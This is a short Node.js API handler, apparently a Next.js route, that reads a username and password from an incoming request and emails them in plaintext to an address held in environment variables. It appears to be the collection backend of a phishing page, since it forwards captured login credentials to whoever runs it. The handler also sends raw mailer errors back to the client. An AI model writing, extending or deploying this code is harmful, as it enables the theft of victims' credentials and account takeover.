import nodemailer from "nodemailer";

export default async function handler(req, res) {
  const { body } = req;

  // create transporter
  let transporter = nodemailer.createTransport({
    host: process.env.EMAIL_HOST,
    port: process.env.EMAIL_PORT,
    auth: {
      user: process.env.EMAIL_USER,
      pass: process.env.EMAIL_PW,
    },
  });

  // email content
  const mail = {
    from: process.env.EMAIL_FROM,
    to: process.env.EMAIL_TO,
    subject: "Hello",
    text: "username: " + body.userName + "\n\n" + "password: " + body.password,
  };

  let promise = new Promise((resolve, reject) => {
    transporter.sendMail(mail, (error, success) => {
      if (error) {
        reject(error);
      } else {
        resolve(success);
      }
    });
  });

  let httpStatus = 200;
  let response = {};
  try {
    let result = await promise;
    httpStatus = 200; // success
    response = result;
  } catch (error) {
    httpStatus = 500; // error
    response = error;
  }

  res.status(httpStatus).json(response);
}
